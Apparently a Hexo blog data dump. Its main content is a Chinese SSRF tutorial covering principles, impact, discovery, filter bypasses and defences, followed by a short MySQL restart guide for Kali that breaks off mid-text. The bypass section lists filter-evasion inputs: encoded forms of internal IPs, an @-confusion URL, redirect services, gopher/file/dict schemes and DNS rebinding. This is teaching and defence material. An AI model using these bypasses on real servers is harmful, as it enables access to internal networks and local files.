title=\"0x03绕过方法\"></a>0x03绕过方法</h1><p>下文出现的192.168.0.1，10.0.0.1全部为服务器端的内网地址。</p>\n<p><strong>1、更改IP\\</strong>地址写法****</p>\n<p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p>\n<p>^10(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$</p>\n<p>^172.([1][6-9]|[2]\\d|3[01])(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$</p>\n<p>^192.168(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$</p>\n<p>对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：</p>\n<p>(1)、8进制格式：0300.0250.0.1</p>\n<p>(2)、16进制格式：0xC0.0xA8.0.1</p>\n<p>(3)、10进制整数格式：3232235521</p>\n<p>(4)、16进制整数格式：0xC0A80001</p>\n<p>还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1</p>\n<p><strong>2**</strong>、利用解析<strong><strong>URL</strong></strong>所出现的问题**</p>\n<p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>\n<p><a href=\"https://link.jianshu.com?t=http://192.168.0.1/\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com@192.168.0.1/</a></p>\n<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a href=\"https://link.jianshu.com?t=http://www.baidu.com/\" target=\"_blank\" rel=\"noopener\">www.baidu.com</a>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<a href=\"https://link.jianshu.com?t=http://www.baidu.com/\" target=\"_blank\" rel=\"noopener\">www.baidu.com</a>，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p>\n<p><strong>3**</strong>、利用<strong><strong>302</strong></strong>跳转**</p>\n<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。</p>\n<p>(1)、在网络上存在一个很神奇的服务，<a href=\"https://link.jianshu.com?t=http://xip.io/\" target=\"_blank\" rel=\"noopener\">http://xip.io</a>当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p>\n<p>(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是<a href=\"https://link.jianshu.com?t=http://tinyurl.com/\" target=\"_blank\" rel=\"noopener\">http://tinyurl.com</a>所提供的短地址服务，如下图所示：</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-3a434cd0d2b841c8.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/481/format/webp\" alt=\"img\"></p>\n<p>同样的，我们也可以自行写一个跳转的服务接口来实现类似的功能。</p>\n<p><strong>4**</strong>、通过各种非<strong><strong>HTTP</strong></strong>协议：**</p>\n<p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p>\n<p>(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-523da0932affc6a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/837/format/webp\" alt=\"img\"></p>\n<p>(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容</p>\n<p>(3)、DICT协议</p>\n<p><a href=\"\"><strong>5</strong></a><strong>、**</strong>DNS Rebinding**</p>\n<p>对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-eed69aa1281f3db2.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/624/format/webp\" alt=\"img\"></p>\n<p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p>\n<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。</p>\n<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>\n<p>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p>\n<p>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证</p>\n<p>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</p>\n<p>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p>\n<h1 id=\"0x04实战案例\"><a href=\"#0x04实战案例\" class=\"headerlink\" title=\"0x04实战案例\"></a>0x04实战案例</h1><p>wooyun漏洞库案例</p>\n<p>weblogic的uddiexplorer，这个好像比较常见一些</p>\n<p>其它待收集补充</p>\n<h1 id=\"0x05防御思路\"><a href=\"#0x05防御思路\" class=\"headerlink\" title=\"0x05防御思路\"></a>0x05防御思路</h1><p>通常有以下5个思路：</p>\n<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>\n<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>\n<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>\n<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>\n<p>6、禁止302跳转</p>\n<p>7、使用gethostbyname（）判断请求是否为内网ip。 要结合6来使用</p>\n<p>其中3、4、5可以通过网络防火墙或者主机防火墙来实现。</p>\n<h1 id=\"0x06参考\"><a href=\"#0x06参考\" class=\"headerlink\" title=\"0x06参考\"></a>0x06参考</h1><p>SSRF攻击实例解析：<a href=\"http://www.freebuf.com/articles/web/20407.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/web/20407.html</a></p>\n<p>SSRF漏洞的挖掘经验：<a href=\"http://bobao.360.cn/learning/detail/240.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/240.html</a></p>\n<p>跨协议通信技术利用：<a href=\"http://www.freebuf.com/articles/web/19622.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/web/19622.html</a></p>\n<p>关于SSRF攻击：<a href=\"http://evilcos.me/?p=221\" target=\"_blank\" rel=\"noopener\">http://evilcos.me/?p=221</a> </p>\n<p>SSRF的新纪元：在编程语言中利用URL解析器：<a href=\"http://bobao.360.cn/learning/detail/4183.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/4183.html</a></p>\n<p>作者：0x525c<br>链接：<a href=\"https://www.jianshu.com/p/10ec9bd3fa0a\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/10ec9bd3fa0a</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"服务端请求伪造攻击\"><a href=\"#服务端请求伪造攻击\" class=\"headerlink\" title=\"服务端请求伪造攻击\"></a>服务端请求伪造攻击</h1><h1 id=\"0x00原理\"><a href=\"#0x00原理\" class=\"headerlink\" title=\"0x00原理\"></a>0x00原理</h1><p>一般的请求：客户端发起请求，服务器响应。</p>\n<p>另外一种请求：客户端发起请求（向服务端提供一个URL），服务端向客户端提供的URL发起请求，然后把获得的响应内容返回给客户端。如：</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-2129ae23303f3bff.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/690/format/webp\" alt=\"img\"></p>\n<p>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等，就可能存在这种服务端请求伪造的缺陷。Google,Facebook,Adobe,baidu,tencent等知名公司都被发现过这种漏洞。</p>\n<h1 id=\"0x01危害\"><a href=\"#0x01危害\" class=\"headerlink\" title=\"0x01危害\"></a>0x01危害</h1><p>攻击者利用ssrf可以实现的攻击主要有5种：</p>\n<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>\n<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>\n<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>\n<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>\n<p>5.利用file协议读取本地文件等。</p>\n<p>常用的利用思路：</p>\n<p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;Payload Result</p>\n<p>1.内网探测: 内网主机信息收集</p>\n<p>2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)</p>\n<p>3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)</p>\n<p>4.Payload Result: 返回相应Payload的执行信息</p>\n<p>为什么通过http协议访问可以同其它协议的端口进行数据交互呢？</p>\n<p>跨协议通信技术利用：<a href=\"http://www.freebuf.com/articles/web/19622.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/web/19622.html</a></p>\n<h1 id=\"0x02漏洞挖掘\"><a href=\"#0x02漏洞挖掘\" class=\"headerlink\" title=\"0x02漏洞挖掘\"></a>0x02漏洞挖掘</h1><p>一切从客户端提交的含有URL的参数都可能存在SSRF漏洞。</p>\n<h4 id=\"常见存在漏洞的场景如下：\"><a href=\"#常见存在漏洞的场景如下：\" class=\"headerlink\" title=\"常见存在漏洞的场景如下：\"></a>常见存在漏洞的场景如下：</h4><p>1、分享功能：通过URL地址分享网页内容。</p>\n<p>2、在线转码服务：把网页内容（URL）在线转码为适合手机浏览的样式。</p>\n<p>3、在线翻译：通过URL地址翻译对应文本内容。</p>\n<p>4、远程图片加载、下载：通过URL加载图片或者下载图片。如：<a href=\"http://www.example.com/picture?url=http://image.example.com/1.jpg\" target=\"_blank\" rel=\"noopener\">http://www.example.com/picture?url=http://image.example.com/1.jpg</a></p>\n<p>5、图片、文章收藏功能：类似于场景1，通过URL收藏到在线收藏夹</p>\n<p>6、未公开的api实现以及其他调用URL的功能：此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>\n<h4 id=\"常见的存在漏洞的参数：\"><a href=\"#常见的存在漏洞的参数：\" class=\"headerlink\" title=\"常见的存在漏洞的参数：\"></a>常见的存在漏洞的参数：</h4><p>share、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain…</p>\n<p>可以结合google语法及上述关键字进行搜索验证。</p>\n<h4 id=\"常见的容易出问题的函数：\"><a href=\"#常见的容易出问题的函数：\" class=\"headerlink\" title=\"常见的容易出问题的函数：\"></a>常见的容易出问题的函数：</h4><p>PHP : file_get_contents()、fsockopen()、curl_exec()</p>\n<p>JAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</p>\n<h4 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h4><p>1、排除法</p>\n<p>确认目标参数中的URL请求是从客户端发起还是从服务端发起的。</p>\n<p>如：<a href=\"https://link.jianshu.com?t=http://www.douban.com/\" target=\"_blank\" rel=\"noopener\">http://www.douban.com/</a>***/service?image=<a href=\"https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/img/bd_logo1.png</a></p>\n<p><strong>排除法一：</strong></p>\n<p>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a href=\"http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p>\n<p><strong>排除法二：</strong></p>\n<p>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-d42d493011d35ee5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/826/format/webp\" alt=\"img\"></p>\n<p>2、实例验证</p>\n<p>首先要进行信息收集，以获得目标内网地址，收集途径：</p>\n<p>a.敏感信息泄露</p>\n<p>b.漏洞平台历史信息中存在目标内网信息</p>\n<p>c.通过二级域名等暴力猜解工具模糊猜测内网地址</p>\n<p>收集到内网地址后，就可以进行实例验证，是否可以请求内网地址、端口、资源等。</p>\n<p>批量验证某个ip地址段端口开放情况可以用burp的爆破功能或者自己写py脚本。</p>\n<h1 id=\"0x03绕过方法\"><a href=\"#0x03绕过方法\" class=\"headerlink\" title=\"0x03绕过方法\"></a>0x03绕过方法</h1><p>下文出现的192.168.0.1，10.0.0.1全部为服务器端的内网地址。</p>\n<p><strong>1、更改IP\\</strong>地址写法****</p>\n<p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p>\n<p>^10(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$</p>\n<p>^172.([1][6-9]|[2]\\d|3[01])(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$</p>\n<p>^192.168(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$</p>\n<p>对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：</p>\n<p>(1)、8进制格式：0300.0250.0.1</p>\n<p>(2)、16进制格式：0xC0.0xA8.0.1</p>\n<p>(3)、10进制整数格式：3232235521</p>\n<p>(4)、16进制整数格式：0xC0A80001</p>\n<p>还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1</p>\n<p><strong>2**</strong>、利用解析<strong><strong>URL</strong></strong>所出现的问题**</p>\n<p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>\n<p><a href=\"https://link.jianshu.com?t=http://192.168.0.1/\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com@192.168.0.1/</a></p>\n<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a href=\"https://link.jianshu.com?t=http://www.baidu.com/\" target=\"_blank\" rel=\"noopener\">www.baidu.com</a>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<a href=\"https://link.jianshu.com?t=http://www.baidu.com/\" target=\"_blank\" rel=\"noopener\">www.baidu.com</a>，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p>\n<p><strong>3**</strong>、利用<strong><strong>302</strong></strong>跳转**</p>\n<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。</p>\n<p>(1)、在网络上存在一个很神奇的服务，<a href=\"https://link.jianshu.com?t=http://xip.io/\" target=\"_blank\" rel=\"noopener\">http://xip.io</a>当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p>\n<p>(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是<a href=\"https://link.jianshu.com?t=http://tinyurl.com/\" target=\"_blank\" rel=\"noopener\">http://tinyurl.com</a>所提供的短地址服务，如下图所示：</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-3a434cd0d2b841c8.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/481/format/webp\" alt=\"img\"></p>\n<p>同样的，我们也可以自行写一个跳转的服务接口来实现类似的功能。</p>\n<p><strong>4**</strong>、通过各种非<strong><strong>HTTP</strong></strong>协议：**</p>\n<p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p>\n<p>(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-523da0932affc6a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/837/format/webp\" alt=\"img\"></p>\n<p>(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容</p>\n<p>(3)、DICT协议</p>\n<p><a href><strong>5</strong></a><strong>、**</strong>DNS Rebinding**</p>\n<p>对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：</p>\n<p><img src=\"https:////upload-images.jianshu.io/upload_images/8531973-eed69aa1281f3db2.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/624/format/webp\" alt=\"img\"></p>\n<p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p>\n<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。</p>\n<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>\n<p>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p>\n<p>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证</p>\n<p>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</p>\n<p>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p>\n<h1 id=\"0x04实战案例\"><a href=\"#0x04实战案例\" class=\"headerlink\" title=\"0x04实战案例\"></a>0x04实战案例</h1><p>wooyun漏洞库案例</p>\n<p>weblogic的uddiexplorer，这个好像比较常见一些</p>\n<p>其它待收集补充</p>\n<h1 id=\"0x05防御思路\"><a href=\"#0x05防御思路\" class=\"headerlink\" title=\"0x05防御思路\"></a>0x05防御思路</h1><p>通常有以下5个思路：</p>\n<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>\n<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>\n<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>\n<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>\n<p>6、禁止302跳转</p>\n<p>7、使用gethostbyname（）判断请求是否为内网ip。 要结合6来使用</p>\n<p>其中3、4、5可以通过网络防火墙或者主机防火墙来实现。</p>\n<h1 id=\"0x06参考\"><a href=\"#0x06参考\" class=\"headerlink\" title=\"0x06参考\"></a>0x06参考</h1><p>SSRF攻击实例解析：<a href=\"http://www.freebuf.com/articles/web/20407.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/web/20407.html</a></p>\n<p>SSRF漏洞的挖掘经验：<a href=\"http://bobao.360.cn/learning/detail/240.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/240.html</a></p>\n<p>跨协议通信技术利用：<a href=\"http://www.freebuf.com/articles/web/19622.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/web/19622.html</a></p>\n<p>关于SSRF攻击：<a href=\"http://evilcos.me/?p=221\" target=\"_blank\" rel=\"noopener\">http://evilcos.me/?p=221</a> </p>\n<p>SSRF的新纪元：在编程语言中利用URL解析器：<a href=\"http://bobao.360.cn/learning/detail/4183.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/4183.html</a></p>\n<p>作者：0x525c<br>链接：<a href=\"https://www.jianshu.com/p/10ec9bd3fa0a\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/10ec9bd3fa0a</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n"},{"layout":"post","title":"在kali上使用mysql时遇到的一些情况","date":"2020-11-10T16:00:00.000Z","description":"一个有用小知识","typora-copy-images-to":"..\\img","_content":"\n\n# 在kali上使用mysql时遇到的一些情况\n\n### 如何重启MySQL，正确启动MySQL\n\nlinux平台及windows平台mysql重启方法\n\n#### 　　Linux下重启MySQL的正确方法：\n\n　　1、通过rpm包安装的MySQL\n\n```\n　service mysqld restart\n```\n\n　　2、从源码包安装的MySQL\n\n　　// linux关闭MySQL的命令\n\n```\n$mysql_dir/bin/mysqladmin -uroot -p shutdown\n```\n\n　　// linux启动MySQL的命令\n\n```\n$mysql_dir/bin/mysqld_safe &\n```\n\n　　其中mysql_dir为MySQL的安装目录，mysqladmin和mysqld_safe位于MySQL安装目录的bin目录下，很容易找到的。\n\n　　3、以上方法都无效的时候，可以通过强行命令：“killall mysql”来关闭MySQL，但是不建议用这样的方式，因为这种野蛮的方法会强行终止MySQL数据库服务，有可能导致表损坏\n\n使用这个命令后，输入mysql的结果可能呈现为\n\nERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock'\n\n使用下面方法启动就行\n\n　　步骤或方法:RedHat Linux (Fedora Core/Cent OS)\n\n　　1.启动：/etc/init.d/mysqld start\n\n　　2.停止：/etc/init.d/mysqld stop\n\n　　3.重启：/etc/init.d/mysqld restart\n\n　　Debian / Ubuntu Linux\n\n　　1.启动：/etc/init.d/mysql start\n\n　　2.停止：/etc/init.d/mysql stop\n\n　　3.重启：/etc/init.d/mysql restart\n\n#### 　　Windows下重启MySQL的正确方法：\n\n　　1.点击“开始”->“运行”(快捷键Win+R)。\n\n　　2.启动：输入 net start mysql\n\n　　3.停止：输入 net stop mysql\n\n\n\n","source":"_posts/2020-11-11-在kali上使用mysql时遇到的一些情况.md","raw":"---\nlayout: post\ntitle: 在kali上使用mysql时遇到的一些情况\ndate: 2020-11-11\ncategories: blog\ntags: [web,kali]\ndescription: 一个有用小知识\ntypora-copy-images-to: ..\\img\n---\n\n\n# 在kali上使用mysql时遇到的一些情况\n\n### 如何重启MySQL，正确启动MySQL\n\nlinux平台及windows平台mysql重启方法\n\n#### 　　Linux下重启MySQL的正确方法：\n\n　　1、通过rpm包安装的MySQL\n\n```\n　service mysqld restart\n```\n\n　　2、从源码包安装的MySQL\n\n　　// linux关闭MySQL的命令\n\n```\n$mysql_dir/bin/mysqladmin -uroot -p shutdown\n```\n\n　　// linux启动MySQL的命令\n\n```\n$mysql_dir/bin/mysqld_safe &\n```\n\n　　其中mysql_dir为MySQL的安装目录，mysqladmin和mysqld_safe位于MySQL安装目录的bin目录下，很容易找到的。\n\n　　3、以上方法都无效的时候，可以通过强行命令：“killall mysql”来关闭MySQL，但是不建议用这样的方式，因为这种野蛮的方法会强行终止MySQL数据库服务，有可能导致表损坏\n\n使用这个命令后，输入mysql的结果可能呈现为\n\nERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock'\n\n使用下面方法启动就行\n\n　　步骤或方法:RedHat Linux (Fedora Core/Cent OS)\n\n　　1.启动：/etc/init.d/mysqld start\n\n　　2.停止：/etc/init.d/mysqld stop\n\n　　3.重启：/etc/init.d/mysqld restart\n\n　　Debian / Ubuntu Linux\n\n　　1.启动：/etc/init.d/mysql start\n\n　　2.停止：/etc/init.d/mysql stop\n\n　　3.重启：/etc/init.d/mysql restart\n\n#### 　　Windows下重启MySQL的正确方法：\n\n　　1.点击“开始”->“运行”(快捷键Win+R)。\n\n　　2.启动：输入 net start mysql\n\n　　3.停止：输入 net stop mysql\n\n\n\n","slug":"2020-11-11-在kali上使用mysql时遇到的一些情况","published":1,"updated":"2020-11-20T02:12:59.181Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jq000xxov7fsf2pr91","content":"<h1 id=\"在kali上使用mysql时遇到的一些情况\"><a href=\"#在kali上使用mysql时遇到的一些情况\" class=\"headerlink\" title=\"在kali上使用mysql时遇到的一些情况\"></a>在kali上使用mysql时遇到的一些情况</h1><h3 id=\"如何重启MySQL，正确启动MySQL\"><a href=\"#如何重启MySQL，正确启动MySQL\" class=\"headerlink\" title=\"如何重启MySQL，正确启动MySQL\"></a>如何重启MySQL，正确启动MySQL</h3><p>linux平台及windows平台mysql重启方法</p>\n<h4 id=\"Linux下重启MySQL的正确方法：\"><a href=\"#Linux下重启MySQL的正确方法：\" class=\"headerlink\" title=\"　　Linux下重启MySQL的正确方法：\"></a>　　Linux下重启MySQL的正确方法：</h4><p>　　1、通过rpm包安装的MySQL</p>\n<pre><code>　service mysqld restart</code></pre><p>　　2、从源码包安装的MySQL</p>\n<p>　　// linux关闭MySQL的命令</p>\n<pre><code>$mysql_dir/bin/mysqladmin -uroot -p shutdown</code></pre><p>　　// linux启动MySQL的命令</p>\n<pre><code>$mysql_dir/bin/mysqld_safe &amp;</code></pre><p>　　其中mysql_dir为MySQL的安装目录，mysqladmin和mysqld_safe位于MySQL安装目录的bin目录下，很容易找到的。</p>\n<p>　　